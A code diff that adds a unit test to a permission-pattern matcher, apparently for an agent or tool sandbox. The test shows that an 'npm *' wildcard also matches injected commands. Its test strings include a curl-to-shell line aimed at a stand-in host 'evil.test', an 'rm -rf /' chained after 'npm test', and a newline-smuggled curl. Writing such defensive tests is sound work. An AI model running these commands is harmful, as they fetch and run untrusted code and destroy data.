@@ -232,6 +232,23 @@ describe("Capability", () => {
     expect(Capability.matches(selectedPattern, capability("proc:spawn", "npmx"))).toBe(false)
   })
 
+  it("lets a trailing command wildcard cover every subcommand and shell metacharacter", () => {
+    // The docs warn that `npm *` is not a safe widening; this pins why.
+    const selectedPattern = pattern("proc:spawn", "npm *")
+
+    for (
+      const resource of [
+        "npm exec attacker-pkg",
+        "npm install attacker-pkg",
+        "npm x; curl https://evil.test | sh",
+        "npm test && rm -rf /",
+        "npm test\ncurl https://evil.test"
+      ]
+    ) {
+      expect(Capability.matches(selectedPattern, capability("proc:spawn", resource))).toBe(true)
+    }
+  })
+
   it("keeps POSIX resource matching case-sensitive", () => {
     expect(
       Capability.matches(pattern("fs:read", "/Work/**"), capability("fs:read", "/work/a"))
